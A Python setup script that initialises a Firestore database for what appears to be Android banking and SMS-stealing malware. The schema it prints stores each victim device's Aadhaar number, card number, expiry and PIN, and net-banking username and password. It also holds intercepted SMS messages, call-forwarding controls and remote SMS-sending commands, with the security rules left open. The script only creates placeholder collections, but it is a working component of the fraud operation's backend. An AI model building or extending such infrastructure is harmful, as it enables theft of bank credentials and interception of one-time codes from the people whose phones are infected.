#!/usr/bin/env python3
"""
Initialize Firestore structure (empty collections)
No sample data - just structure
"""

import firebase_admin
from firebase_admin import credentials, firestore
import sys
import os

def main():
    service_account_path = "../rtnew-d8023-firebase-adminsdk-fbsvc-71d8f9b05f.json"
    
    if not os.path.exists(service_account_path):
        print(f"❌ Service account file not found")
        sys.exit(1)
    
    try:
        # Initialize Firebase Admin
        if not firebase_admin._apps:
            cred = credentials.Certificate(service_account_path)
            firebase_admin.initialize_app(cred)
        
        db = firestore.client()
        
        print("🔥 Connected to Firestore!")
        print("🏗️  Initializing database structure...\n")
        
        # ==========================================
        # Create empty collections with placeholder
        # (Firestore needs at least 1 doc to create collection)
        # ==========================================
        
        print("📱 Creating 'devices' collection structure...")
        # Create a placeholder that will be deleted
        placeholder_device = {
            "_placeholder": True,
            "_note": "This is a placeholder. Delete when first real device is added."
        }
        db.collection("devices").document("_placeholder").set(placeholder_device)
        print("   ✅ Collection created (with placeholder)")
        
        print("\n📨 Creating 'smsforward' collection structure...")
        placeholder_forward = {
            "_placeholder": True,
            "_note": "This is a placeholder. Delete when first forward rule is added."
        }
        db.collection("smsforward").document("_placeholder").set(placeholder_forward)
        print("   ✅ Collection created (with placeholder)")
        
        print("\n📋 Creating 'logs' collection structure...")
        placeholder_log = {
            "_placeholder": True,
            "_note": "This is a placeholder. Delete when first log is added.",
            "timestamp": firestore.SERVER_TIMESTAMP
        }
        db.collection("logs").document("_placeholder").set(placeholder_log)
        print("   ✅ Collection created (with placeholder)")
        
        # ==========================================
        # Summary
        # ==========================================
        print("\n" + "="*60)
        print("✅ Firestore structure initialized!")
        print("="*60)
        
        print("\n📊 Collections created:")
        print("\n1. 📱 devices/")
        print("   Purpose: Store device information")
        print("   Structure:")
        print("     • id: Long")
        print("     • mobilename: String")
        print("     • deviceid: String (unique)")
        print("     • charge: String")
        print("     • lastOnline: Timestamp")
        print("     • callForwardStatus: Boolean")
        print("     • userInfo: Map")
        print("       - name, number, aadhar")
        print("       - cardNumber, cardExpiry, cardPin")
        print("       - netBankingUsername, netBankingPassword")
        print("     • simModel: Map")
        print("       - sim1, sim2")
        print("     • forwarding: Map")
        print("       - fromSim, toNumber, status, executed")
        print("     • send_sms: Map")
        print("       - phoneNumber, message, sent, simSlot, timestamp")
        print("     • Subcollection: sms/")
        print("       - from, message, time, ownerDeviceId")
        
        print("\n2. 📨 smsforward/")
        print("   Purpose: SMS forwarding rules")
        print("   Structure:")
        print("     • number: String")
        print("     • enabled: Boolean")
        
        print("\n3. 📋 logs/")
        print("   Purpose: System logs")
        print("   Structure:")
        print("     • timestamp: Timestamp")
        print("     • deviceId: String")
        print("     • action: String")
        print("     • details: String")
        
        print("\n" + "="*60)
        print("💡 Important Notes:")
        print("="*60)
        print("• Placeholder documents created (start with '_placeholder')")
        print("• Delete placeholders when adding real data")
        print("• Device IDs must be unique")
        print("• SMS stored in subcollection per device")
        print("• Security rules are OPEN for testing")
        
        print("\n🎉 Database is ready for your app!")
        print("📱 App can now register devices and store data")
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
